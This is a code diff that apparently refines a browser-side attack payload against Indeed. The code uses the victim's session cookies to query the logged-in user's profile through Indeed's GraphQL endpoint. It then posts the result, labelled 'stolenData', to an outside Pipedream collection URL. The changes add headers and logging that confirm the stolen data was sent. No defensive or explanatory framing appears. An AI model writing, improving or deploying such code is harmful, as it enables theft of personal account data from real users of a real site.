@@ -12,7 +12,10 @@
     fetch("https://profile.indeed.com/graphql", {
       method: "POST",
       credentials: "include",  // Sends cookies with the request
-      headers: { "Content-Type": "application/json" },
+      headers: { 
+        "Content-Type": "application/json", 
+        "Accept": "application/json"  // Adding the Accept header
+      },
       body: JSON.stringify({
         query: `query {
           currentUser {
@@ -51,8 +54,17 @@
       // Send the stolen data to Pipedream
       fetch("https://eoz1h6ajlr4q9nf.m.pipedream.net", {  // Replace with your Pipedream URL
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: { 
+          "Content-Type": "application/json", 
+          "Accept": "application/json"  // Adding the Accept header
+        },
         body: JSON.stringify({ stolenData: data })
+      }).then(pipedreamResponse => {
+        if (pipedreamResponse.ok) {
+          console.log("Data sent successfully to Pipedream");
+        }
+      }).catch(error => {
+        console.error("Error sending data to Pipedream:", error);
       });
     })
     .catch(console.error);
